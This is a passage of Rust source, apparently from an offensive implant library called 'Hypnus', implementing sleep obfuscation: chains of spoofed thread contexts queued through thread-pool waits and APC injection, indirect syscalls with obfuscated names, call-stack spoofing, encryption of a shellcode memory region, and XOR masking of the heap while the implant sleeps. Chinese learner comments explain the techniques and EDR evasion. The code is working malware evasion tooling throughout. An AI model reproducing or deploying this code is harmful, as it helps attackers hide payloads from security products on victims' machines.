            ctxs[9].Rcx = events[3] as u64;
            ctxs[9].Rdx = 0;

            // Layout spoofed CONTEXT chain on stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Wait)?;

            // Patch old_protect into expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule each CONTEXT via TpAllocWait
            for ctx in &mut ctxs {
                let mut wait = null_mut();
                status = TpAllocWait(
                    &mut wait, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );

                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocWait Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetWait(wait, events[0], &mut delay);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[2], events[3], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// Performs memory obfuscation using APC injection and hijacked thread contexts.
    fn foliage(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create a manual-reset synchronization event to be signaled after execution
            let mut event = null_mut();
            let mut status = NtCreateEvent(
                &mut event, 
                EVENT_ALL_ACCESS, 
                null_mut(), 
                EVENT_TYPE::SynchronizationEvent, 
                0
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateEvent Failed"));
            }

            // Create a new thread in suspended state for APC injection
            let mut h_thread = null_mut::<c_void>();
            status = uwd::syscall!(
                obf!("NtCreateThreadEx"),
                h_thread.as_ptr_mut(),
                THREAD_ALL_ACCESS,
                null_mut::<c_void>(),
                NtCurrentProcess(),
                (self.cfg.tp_release_cleanup.as_ptr()).add(0x250),
                null_mut::<c_void>(),
                1,
                0,
                0x1000 * 20,
                0x1000 * 20,
                null_mut::<c_void>()
            )? as NTSTATUS;

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateThreadEx Failed"));
            }

            // Get the initial context of the suspended thread
            let mut ctx_init = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            status = uwd::syscall!(obf!("NtGetContextThread"), h_thread, ctx_init.as_ptr_mut())? as NTSTATUS;
            if !NT_SUCCESS(status) {
                bail!(s!("NtGetContextThread Failed"));
            }

            // Clone the base context 10 times for the full spoofed execution chain
            let mut ctxs = [ctx_init; 10];

            // Duplicate the current thread handle
            let mut thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Preparing for call stack spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = event as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporarily makes the target memory region writable before encryption
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypts or masks the specified memory region
            ctxs[2].Rip = self.cfg.system_function040.into();
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Saves the original CONTEXT so it can be restored later
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].Rip = self.cfg.nt_get_context_thread.into();
            ctxs[3].Rcx = thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
            ctxs[4].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[4].Rcx = thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep primitive using the current thread handle and a delay
            ctxs[5].Rip = self.cfg.wait_for_single.into();
            ctxs[5].Rcx = thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypts (unmasks) the memory after waking up
            ctxs[6].Rip = self.cfg.system_function041.into();
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restores the memory protection after decryption.
            ctxs[7].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restores the original thread context
            ctxs[8].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[8].Rcx = thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Gracefully terminates the helper thread after all steps are complete.
            ctxs[9].Rip = self.cfg.rtl_exit_user_thread.into();
            ctxs[9].Rcx = h_thread as u64;
            ctxs[9].Rdx = 0;

            // Layout the entire spoofed CONTEXT chain on the stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Foliage)?;

            // Write `old_protect` values into the expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Queue each CONTEXT as an APC to be executed in sequence
            for ctx in &mut ctxs {
                status = NtQueueApcThread(
                    h_thread,
                    self.cfg.nt_continue.as_ptr().cast_mut(),
                    ctx as *mut _ as *mut c_void,
                    null_mut(),
                    null_mut(),
                );

                if !NT_SUCCESS(status) {
                    bail!(s!("NtQueueApcThread Failed"));
                }
            }

            // Trigger the APC chain by resuming the thread in alertable state
            status = NtAlertResumeThread(h_thread, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtAlertResumeThread Failed"));
            }

            // If heap obfuscation is enabled, encrypt memory before execution
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait until the thread finishes the spoofed chain
            status = NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Clean up all handles
            NtClose(event);
            NtClose(h_thread);
            NtClose(thread);
        }

        Ok(())
    }
}

#[doc(hidden)]
pub mod __private {
    // A pointer type that uniquely owns a heap allocation of type T.
    // 用于在堆上分配内存,跨越纤程切换时的栈边界
    use alloc::boxed::Box;
    // 导入父模块
    use super::*;

    /// Execution sequence using the specified obfuscation strategy.
    pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
        // mastetr是一个承载了fiber handle的变量,类型是*mut c_void.这里通过调用win api ConvertThreadToFiber将该thread转为fiber
        // 在Winapis struct中pub ConvertThreadToFiber: ConvertThreadToFiberFn
        // 接着在Winapis中的winapi()通过get_proc_address找到对应的函数地址.
        // 是一种抽象类型定义/真实内存地址的绑定过程(称为动态api解析)
        // indirect syscall:跳转到ntdll内部的一段代码,利用dll内部原本存在的syscall指令调用对应的寒湖是
        // direct syscall:将SSN系统调用号加载到exa寄存器执行syscall
        let master = ConvertThreadToFiber(null_mut());
        // 极端EDR下,会监控该api/系统资源枯竭导致thread to fiber失败.不检查master-null的情况,会出现蓝屏BSOD/Crash的情况
        if master.is_null() {
            return;
        }

        match Hypnus::new(base as u64, size, time, mode) {
            Ok(hypnus) => {
                // Creates the context to be passed into the new fiber.
                // 旧栈执行的代码无法直接访问新栈的变量,必须把数据放在heap上
                let fiber_ctx = Box::new(FiberContext {
                    
                    hypnus: Box::new(hypnus),
                   
                    obf,
                    
                    master,
                });

                // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
                let fiber = CreateFiber(
                    // 堆栈初始提交大小
                    0x100000, 
                    // 由fiber执行的函数的指针
                    Some(hypnus_fiber), 
                    // 指向传递给fiber的变量的指针
                    Box::into_raw(fiber_ctx).cast()
                );
                
                if fiber.is_null() {
                    return;
                }

                SwitchToFiber(fiber);
                DeleteFiber(fiber);
                ConvertFiberToThread();
            }
            Err(_error) => {
                #[cfg(debug_assertions)]
                dinvk::println!("[Hypnus::new] {:?}", _error);
            }
        }
    }

    /// Structure passed to the fiber containing the [`Hypnus`].
    struct FiberContext {
        hypnus: Box<Hypnus>,
        obf: Obfuscation,
        master: *mut c_void,
    }

    /// Trampoline function executed inside the fiber.
    ///
    /// It unpacks the `FiberContext`, runs the selected obfuscation method,
    /// and optionally logs errors in debug mode.
    extern "system" fn hypnus_fiber(ctx: *mut c_void) {
        unsafe {
            let mut ctx = Box::from_raw(ctx as *mut FiberContext);
            let _result = match ctx.obf {
                Obfuscation::Timer   => ctx.hypnus.timer(),
                Obfuscation::Wait    => ctx.hypnus.wait(),
                Obfuscation::Foliage => ctx.hypnus.foliage(),
            };

            #[cfg(debug_assertions)]
            if let Err(_error) = _result {
                dinvk::println!("[Hypnus] {:?}", _error);
            }

            SwitchToFiber(ctx.master);
        }
    }
}

trait Asu64 {
    /// Converts `self` to a `u64` representing the pointer value.
    fn as_u64(&mut self) -> u64;
}

impl<T> Asu64 for T {
    fn as_u64(&mut self) -> u64 {
        // self代表调用这个方法的变量本身(比如base);由于函数参数就是&mut self.此时传入的就是对这个变量的引用.物理层面,self对应的寄存器中就是base自身的物理地址.base存储的是指向shellcode的一级指针
        //self as *mut _ 从引用(rust的有保证的引用)变为raw pointer;_ 让编译器自动推导类型(如base是u64,这里就是*mut u64);跨越了rust编译器的安全边界(不再检查这块内存的生命周期),拿到了这块内存的物理访问权.这里提取了指针变量base 的指针
        // as *mut c_void将所有类型指针转为c_void无类型指针;以此符合Windows c的接口标准(FFI)
        // 假设base 值:0x7FF12345 (Shellcode 的地址);内存位置：0x0012FF40 (变量在栈上的位置)
        // 这里返回的是一个指针本身的值(即物理地址),即逻辑上指针的地址等价于二级指针
        // 关键误区在于,base作为一个变量,它的value代表该变量内部的值,它的address代表其在内存中(栈)的位置.这里取了base的address,而不是value.取到后这里存的是base的地址,要获得value,发生了两次跳转.所以叫二级指针
        // gemini总结:变量 base遵循物理实体的‘址/值’双重性：其内部存储的一级指针（Value）指向攻击载荷，其在栈上的物理坐标（Address）则构成了访问该指针的唯一入口。as_u64()的原子逻辑是提取该变量的‘物理坐标’而非其‘存储内容’。这一动作在逻辑拓扑上强制增加了一个跳转层级，使得原本的一级地址变量被具现化为功能性的二级指针（Double Indirection），从而实现了与内核 API 在内存重定位与结果反馈机制上的物理对齐
        self as *mut _ as *mut c_void as u64
    }
}

/// Iterates over all entries in the process heap and applies
/// an XOR operation to the data of entries marked as allocated.
fn obfuscate_heap(key: &[u8; 8]) {
    let heap = HypnusHeap::get();
    if heap.is_null() {
        return;
    }

    // Walk through all heap entries
    let mut entry = unsafe { zeroed::<RTL_HEAP_WALK_ENTRY>() };
    while RtlWalkHeap(heap, &mut entry) != 0 {
        // Check if the entry is in use (allocated block)
        if entry.Flags & 4 != 0 {
            xor(entry.DataAddress as *mut u8, entry.DataSize, key);
        }
    }
}

/// Applies an XOR transformation to a memory region using the given key.
fn xor(data: *mut u8, len: usize, key: &[u8; 8]) {
    if data.is_null() {
        return;
    }

    for i in 0..len {
        unsafe {
            *data.add(i) ^= key[i % key.len()];
        }
    }
}